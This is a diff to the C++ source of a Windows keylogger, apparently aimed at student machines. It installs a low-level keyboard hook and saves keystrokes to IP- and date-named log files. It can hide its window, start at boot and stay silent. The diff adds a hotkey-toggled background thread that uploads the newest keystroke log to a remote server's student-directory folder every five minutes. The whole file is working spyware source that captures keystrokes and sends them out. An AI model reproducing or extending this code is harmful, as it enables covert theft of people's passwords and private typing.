@@ -21,10 +21,8 @@
 #include <shlwapi.h>
 #pragma comment(lib, "Shlwapi.lib")
 
-
 using json = nlohmann::json;
 namespace fs = std::filesystem;
-
 
 // defines whether the window is visible or not
 // should be solved with makefile, not in this file
@@ -46,6 +44,17 @@ namespace fs = std::filesystem;
 
 bool isRecording = true;
 HHOOK _hook;
+
+// 上传功能控制变量
+bool uploadEnabled = false;        // 上传功能默认关闭
+bool uploadThreadRunning = false;   // 上传线程是否运行
+HANDLE hUploadThread = NULL;        // 上传线程句柄
+
+// ---------------------- 前置声明 ----------------------
+size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s);
+std::string readFileContent(const std::string& filePath);
+std::string getExecutableDir();
+// ----------------------------------------------------
 
 #if FORMAT == 0
 const std::map<int, std::string> keyname{
@@ -90,8 +99,6 @@ void ReleaseHook()
 {
     UnhookWindowsHookEx(_hook);
 }
-
-
 
 int Save(int key_stroke)
 {
@@ -200,7 +207,7 @@ const wchar_t* APP_NAME = L"MyKeylogger";
 // 获取当前程序完整路径
 std::wstring GetModulePath()
 {
-    wchar_t path[MAX_PATH] = {0};
+    wchar_t path[MAX_PATH] = { 0 };
     GetModuleFileNameW(NULL, path, MAX_PATH);
     return std::wstring(path);
 }
@@ -284,7 +291,7 @@ std::string GetLocalIPAddress()
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
         return ip;
 
-    char hostname[256] = {0};
+    char hostname[256] = { 0 };
     if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR)
     {
         WSACleanup();
@@ -310,7 +317,7 @@ std::string GetLocalIPAddress()
     {
         if (ptr->ai_family == AF_INET)
         {
-            char ipstr[INET_ADDRSTRLEN] = {0};
+            char ipstr[INET_ADDRSTRLEN] = { 0 };
             sockaddr_in* sa = (sockaddr_in*)ptr->ai_addr;
             InetNtopA(AF_INET, &sa->sin_addr, ipstr, INET_ADDRSTRLEN);
             std::string candidate(ipstr);
@@ -344,7 +351,7 @@ std::string GetLocalIPAddress()
 
 std::string GetDateString()
 {
-    char buf[32] = {0};
+    char buf[32] = { 0 };
     time_t t = time(NULL);
     struct tm tm_info;
     localtime_s(&tm_info, &t);
@@ -357,7 +364,7 @@ std::string MakeOutputFilename()
 {
     std::string ip = GetLocalIPAddress();
     // 将 IP 中可能的非法字符（极少）替换为 '-'
-    for (char &c : ip)
+    for (char& c : ip)
     {
         if (c == '/' || c == '\\' || c == ':' || c == '*' || c == '?' || c == '\"' || c == '<' || c == '>' || c == '|')
             c = '-';
@@ -366,108 +373,18 @@ std::string MakeOutputFilename()
     return ip + "_" + date + ".log";
 }
 
-LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
-{
-    if (nCode >= 0)
-    {
-        // the action is valid: HC_ACTION.
-        if (wParam == WM_KEYDOWN)
-        {
-            // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
-            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
+// ---------- 上传功能相关函数 ----------
 
-            // Check for Ctrl + Shift + Alt + P
-            if (kbdStruct.vkCode == 'P' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
-            {
-                isRecording = !isRecording;
-                if (isRecording)
-                {
-                    std::cout << "录制继续\n";
-                    MessageBox(NULL, L"继续录(/≧▽≦)/", L"录制继续", MB_OK);
-                }
-                else
-                {
-                    std::cout << "录制暂停\n";
-                    MessageBox(NULL, L"不录啦╰(￣ω￣ｏ)", L"录制暂停", MB_OK);
-                }
-            }
-            // Check for Ctrl + Shift + Alt + Q
-            else if (kbdStruct.vkCode == 'Q' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
-            {
-                MessageBox(NULL, L"真不录啦（*゜ー゜*）\n\n那拜拜啦(o゜▽゜)o☆", L"录制结束", MB_OK);
-                std::cout << "录制结束\n";
-                ReleaseHook();
-                output_file.close();
-                exit(0);
-            }
-            // Check for Ctrl + Shift + Alt + S (开机自启)
-            else if (kbdStruct.vkCode == 'S' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
-            {
-                bool enabled = IsAutoStartEnabled();
-                if (SetAutoStart(!enabled))
-                {
-                    if (!enabled)
-                        MessageBox(NULL, L"已设置为开机自啟 awa", L"自启设置", MB_OK);
-                    else
-                        MessageBox(NULL, L"已取消开机自启 qaq", L"自启设置", MB_OK);
-                }
-                else
-                {
-                    MessageBox(NULL, L"自启设置失败，请以管理员身份运行w", L"自启设置", MB_OK | MB_ICONERROR);
-                }
-            }
-            // Check for Ctrl + Shift + Alt + D (静默启动)
-            else if (kbdStruct.vkCode == 'D' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
-            {
-                bool silent = IsSilentMode();
-                if (SetSilentMode(!silent))
-                {
-                    if (!silent)
-                        MessageBox(NULL, L"已设置为静默启动（下次启动不再弹窗）", L"静默启动", MB_OK);
-                    else
-                        MessageBox(NULL, L"已取消静默启动（下次启动会弹窗）", L"静默启动", MB_OK);
-                }
-                else
-                {
-                    MessageBox(NULL, L"设置静默启动失败，请以管理员身份运行", L"静默启动", MB_OK | MB_ICONERROR);
-                }
-            }
-            else
-            {
-                // save to file only if recording
-                if (isRecording)
-                {
-                    Save(kbdStruct.vkCode);
-                }
-            }
-        }
+// CURL 回调函数：捕获响应数据
+size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
+    size_t newLength = size * nmemb;
+    try {
+        s->append((char*)contents, newLength);
     }
-
-    // call the next hook in the hook chain. This is necessary or your hook chain will break and the hook stops
-    return CallNextHookEx(_hook, nCode, wParam, lParam);
-}
-
-void SetHook()
-{
-    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
-    {
-        LPCWSTR a = L"Failed to install hook!";
-        LPCWSTR b = L"Error";
-        MessageBox(NULL, a, b, MB_ICONERROR);
+    catch (std::bad_alloc& e) {
+        return 0;
     }
-}
-
-// 获取程序当前执行目录
-std::string getExecutableDir() {
-    char exePath[MAX_PATH];
-    DWORD len = GetModuleFileNameA(NULL, exePath, MAX_PATH);
-    if (len == 0) {
-        std::cerr << "获取程序路径失败，错误码: " << GetLastError() << std::endl;
-        return "";
-    }
-    std::string path(exePath, len);
-    size_t lastSlash = path.find_last_of("\\/");
-    return (lastSlash != std::string::npos) ? path.substr(0, lastSlash + 1) : "";
+    return newLength;
 }
 
 // 读取文件内容到内存（用于上传）
@@ -487,16 +404,60 @@ std::string readFileContent(const std::string& filePath) {
     return buffer;
 }
 
-// CURL 回调函数：捕获响应数据
-size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
-    size_t newLength = size * nmemb;
-    try {
-        s->append((char*)contents, newLength);
+// 获取程序当前执行目录
+std::string getExecutableDir() {
+    char exePath[MAX_PATH];
+    DWORD len = GetModuleFileNameA(NULL, exePath, MAX_PATH);
+    if (len == 0) {
+        std::cerr << "获取程序路径失败，错误码: " << GetLastError() << std::endl;
+        return "";
     }
-    catch (std::bad_alloc& e) {
-        return 0;
+    std::string path(exePath, len);
+    size_t lastSlash = path.find_last_of("\\/");
+    return (lastSlash != std::string::npos) ? path.substr(0, lastSlash + 1) : "";
+}
+
+// 筛选符合格式的日志文件并返回最新的一个
+std::string findLatestLogFile(const std::string& dir) {
+    if (dir.empty() || !fs::exists(dir) || !fs::is_directory(dir)) {
+        std::cerr << "目录不存在或无效: " << dir << std::endl;
+        return "";
     }
-    return newLength;
+
+    // 正则表达式：匹配 <IP>_<YYYYMMDD>.log 格式
+    // IP 格式：xxx.xxx.xxx.xxx（简单匹配，不严格验证 IP 合法性）
+    // 日期格式：YYYYMMDD（8位数字）
+    std::regex logPattern(R"((\d+\.\d+\.\d+\.\d+)_(\d{8})\.log)");
+    std::smatch match;
+
+    std::vector<std::pair<std::string, std::string>> validLogs;  // 存储（文件名，日期）
+
+    // 遍历目录下的所有文件
+    for (const auto& entry : fs::directory_iterator(dir)) {
+        if (entry.is_regular_file()) {  // 只处理文件
+            std::string fileName = entry.path().filename().string();
+            if (std::regex_match(fileName, match, logPattern)) {
+                // 提取日期部分（第2个捕获组）
+                std::string dateStr = match[2].str();
+                validLogs.emplace_back(fileName, dateStr);
+                std::cout << "发现符合格式的日志文件: " << fileName << "（日期: " << dateStr << "）" << std::endl;
+            }
+        }
+    }
+
+    if (validLogs.empty()) {
+        std::cerr << "未找到符合格式的日志文件（<IP>_<YYYYMMDD>.log）" << std::endl;
+        return "";
+    }
+
+    // 按日期降序排序（最新的日期在前面）
+    std::sort(validLogs.begin(), validLogs.end(),
+        [](const auto& a, const auto& b) {
+            return a.second > b.second;  // 日期字符串直接比较（YYYYMMDD 格式可直接排序）
+        });
+
+    // 返回最新文件的完整路径
+    return dir + validLogs[0].first;
 }
 
 // 获取 token
@@ -593,84 +554,186 @@ void uploadFile(const std::string& token, const std::string& localFilePath, cons
     }
 }
 
-// 筛选符合格式的日志文件并返回最新的一个
-std::string findLatestLogFile(const std::string& dir) {
-    if (dir.empty() || !fs::exists(dir) || !fs::is_directory(dir)) {
-        std::cerr << "目录不存在或无效: " << dir << std::endl;
-        return "";
+// 上传最新日志文件的封装函数
+void uploadLatestLog()
+{
+    // 1. 获取 token
+    std::string token = api_get();
+    if (token.empty()) {
+        std::cerr << "获取 token 失败，跳过上传" << std::endl;
+        return;
     }
 
-    // 正则表达式：匹配 <IP>_<YYYYMMDD>.log 格式
-    // IP 格式：xxx.xxx.xxx.xxx（简单匹配，不严格验证 IP 合法性）
-    // 日期格式：YYYYMMDD（8位数字）
-    std::regex logPattern(R"((\d+\.\d+\.\d+\.\d+)_(\d{8})\.log)");
-    std::smatch match;
+    // 2. 获取程序执行目录
+    std::string exeDir = getExecutableDir();
+    if (exeDir.empty()) return;
 
-    std::vector<std::pair<std::string, std::string>> validLogs;  // 存储（文件名，日期）
+    // 3. 查找最新的日志文件
+    std::string latestLogPath = findLatestLogFile(exeDir);
+    if (latestLogPath.empty()) return;
 
-    // 遍历目录下的所有文件
-    for (const auto& entry : fs::directory_iterator(dir)) {
-        if (entry.is_regular_file()) {  // 只处理文件
-            std::string fileName = entry.path().filename().string();
-            if (std::regex_match(fileName, match, logPattern)) {
-                // 提取日期部分（第2个捕获组）
-                std::string dateStr = match[2].str();
-                validLogs.emplace_back(fileName, dateStr);
-                std::cout << "发现符合格式的日志文件: " << fileName << "（日期: " << dateStr << "）" << std::endl;
+    // 4. 配置服务器路径（保持与本地文件名一致）
+    fs::path logPath(latestLogPath);
+    std::string fileName = logPath.filename().string();
+    std::string serverFile = "/%E5%AD%A6%E7%94%9F%E7%9B%AE%E5%BD%95/log/" + fileName;
+
+    // 5. 上传文件
+    uploadFile(token, latestLogPath, serverFile);
+}
+
+// 上传线程函数
+DWORD WINAPI UploadThreadFunc(LPVOID lpParam)
+{
+    while (uploadEnabled && uploadThreadRunning)
+    {
+        uploadLatestLog();
+        // 每5分钟上传一次（可根据需要调整间隔）
+        for (int i = 0; i < 300 && uploadEnabled && uploadThreadRunning; ++i)
+            Sleep(1000);
+    }
+    uploadThreadRunning = false;
+    return 0;
+}
+
+// ---------- 键盘钩子回调函数 ----------
+LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
+{
+    if (nCode >= 0)
+    {
+        // the action is valid: HC_ACTION.
+        if (wParam == WM_KEYDOWN)
+        {
+            // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
+            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
+
+            // Check for Ctrl + Shift + Alt + P
+            if (kbdStruct.vkCode == 'P' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
+            {
+                isRecording = !isRecording;
+                if (isRecording)
+                {
+                    std::cout << "录制继续\n";
+                    MessageBox(NULL, L"继续录(/≧▽≦)/", L"录制继续", MB_OK);
+                }
+                else
+                {
+                    std::cout << "录制暂停\n";
+                    MessageBox(NULL, L"不录啦╰(￣ω￣ｏ)", L"录制暂停", MB_OK);
+                }
+            }
+            // Check for Ctrl + Shift + Alt + Q
+            else if (kbdStruct.vkCode == 'Q' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
+            {
+                MessageBox(NULL, L"真不录啦（*゜ー゜*）\n\n那拜拜啦(o゜▽゜)o☆", L"录制结束", MB_OK);
+                std::cout << "录制结束\n";
+                ReleaseHook();
+                output_file.close();
+                exit(0);
+            }
+            // Check for Ctrl + Shift + Alt + S (开机自启)
+            else if (kbdStruct.vkCode == 'S' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
+            {
+                bool enabled = IsAutoStartEnabled();
+                if (SetAutoStart(!enabled))
+                {
+                    if (!enabled)
+                        MessageBox(NULL, L"已设置为开机自啟 awa", L"自启设置", MB_OK);
+                    else
+                        MessageBox(NULL, L"已取消开机自启 qaq", L"自启设置", MB_OK);
+                }
+                else
+                {
+                    MessageBox(NULL, L"自启设置失败，请以管理员身份运行w", L"自启设置", MB_OK | MB_ICONERROR);
+                }
+            }
+            // Check for Ctrl + Shift + Alt + D (静默启动)
+            else if (kbdStruct.vkCode == 'D' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
+            {
+                bool silent = IsSilentMode();
+                if (SetSilentMode(!silent))
+                {
+                    if (!silent)
+                        MessageBox(NULL, L"已设置为静默启动（下次启动不再弹窗）", L"静默启动", MB_OK);
+                    else
+                        MessageBox(NULL, L"已取消静默启动（下次启动会弹窗）", L"静默启动", MB_OK);
+                }
+                else
+                {
+                    MessageBox(NULL, L"设置静默启动失败，请以管理员身份运行", L"静默启动", MB_OK | MB_ICONERROR);
+                }
+            }
+            // Check for Ctrl + Shift + Alt + U (上传开关)
+            else if (kbdStruct.vkCode == 'U' && (GetKeyState(VK_CONTROL) & 0x8000) &&
+                (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
+            {
+                uploadEnabled = !uploadEnabled;
+                if (uploadEnabled)
+                {
+                    // 启动上传线程（如果尚未运行）
+                    if (!uploadThreadRunning)
+                    {
+                        uploadThreadRunning = true;
+                        hUploadThread = CreateThread(NULL, 0, UploadThreadFunc, NULL, 0, NULL);
+                        if (hUploadThread)
+                            CloseHandle(hUploadThread); // 线程独立运行，不需要等待句柄
+                        MessageBox(NULL, L"上传功能已开启，将定期上传日志文件", L"上传开关", MB_OK);
+                    }
+                    else
+                    {
+                        MessageBox(NULL, L"上传功能已开启（线程已在运行）", L"上传开关", MB_OK);
+                    }
+                }
+                else
+                {
+                    // 关闭上传功能：设置标志让线程自然退出
+                    uploadThreadRunning = false;
+                    // 可选：等待线程结束（但不强制等待，避免阻塞钩子）
+                    if (hUploadThread)
+                        WaitForSingleObject(hUploadThread, 5000);
+                    MessageBox(NULL, L"上传功能已关闭", L"上传开关", MB_OK);
+                }
+            }
+            else
+            {
+                // save to file only if recording
+                if (isRecording)
+                {
+                    Save(kbdStruct.vkCode);
+                }
             }
         }
     }
 
-    if (validLogs.empty()) {
-        std::cerr << "未找到符合格式的日志文件（<IP>_<YYYYMMDD>.log）" << std::endl;
-        return "";
-    }
-
-    // 按日期降序排序（最新的日期在前面）
-    std::sort(validLogs.begin(), validLogs.end(),
-        [](const auto& a, const auto& b) {
-            return a.second > b.second;  // 日期字符串直接比较（YYYYMMDD 格式可直接排序）
-        });
-
-    // 返回最新文件的完整路径
-    return dir + validLogs[0].first;
+    // call the next hook in the hook chain. This is necessary or your hook chain will break and the hook stops
+    return CallNextHookEx(_hook, nCode, wParam, lParam);
 }
 
+void SetHook()
+{
+    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
+    {
+        LPCWSTR a = L"Failed to install hook!";
+        LPCWSTR b = L"Error";
+        MessageBox(NULL, a, b, MB_ICONERROR);
+    }
+}
 
 int main()
 {
     Stealth();
-    std::string token = api_get();
-    if (token.empty()) {
-        return 1;
-    }
-    std::cout << "获取到 token: " << token << std::endl;
 
-    // 2. 获取程序执行目录
-    std::string exeDir = getExecutableDir();
-    if (exeDir.empty()) {
-        return 1;
-    }
-    std::cout << "程序执行目录: " << exeDir << std::endl;
-
-    // 3. 查找最新的日志文件
-    std::string latestLogPath = findLatestLogFile(exeDir);
-    if (latestLogPath.empty()) {
-        return 1;
-    }
-    std::cout << "最新的日志文件: " << latestLogPath << std::endl;
-
-    // 4. 配置服务器目标路径（保持与本地文件名一致，上传到服务器的临时文件夹）
-    fs::path logPath(latestLogPath);
-    std::string fileName = logPath.filename().string();  // 提取文件名（如 192.168.1.2_20251019.log）
-    std::string serverFile = "/%E5%AD%A6%E7%94%9F%E7%9B%AE%E5%BD%95/log/" + fileName;  // 服务器路径（根据实际调整）
-
-    // 5. 上传文件
-    uploadFile(token, latestLogPath, serverFile);
-
+    // 静默模式提示（如果未开启静默模式则显示启动提示）
     if (!IsSilentMode()) {
-        MessageBox(NULL, L"开录 q(≧▽≦q)\n\n快捷键小提示ww\nCtrl + Shift + Alt + P  暂停录制\nCtrl + Shift + Alt + Q  结束录制\nCtrl + Shift + Alt + S  设置/取消开机自启\nCtrl + Shift + Alt + D  设置/取消静默启动\n\n录制日志将保存在当前目录ヾ(≧▽≦*)o，文件名格式为 ip_日期.log  例：192.168.1.2_20251019.log", L"录制开始", MB_OK);
+        MessageBox(NULL, L"开录 q(≧▽≦q)\n\n快捷键小提示ww\n"
+            L"Ctrl + Shift + Alt + P  暂停录制\n"
+            L"Ctrl + Shift + Alt + Q  结束录制\n"
+            L"Ctrl + Shift + Alt + S  设置/取消开机自启\n"
+            L"Ctrl + Shift + Alt + D  设置/取消静默启动\n"
+            L"Ctrl + Shift + Alt + U  开启/关闭上传功能\n\n"
+            L"录制日志将保存在当前目录，文件名 ip_日期.log",
+            L"录制开始", MB_OK);
     }
+
 #ifdef bootwait 
     while (IsSystemBooting())
     {
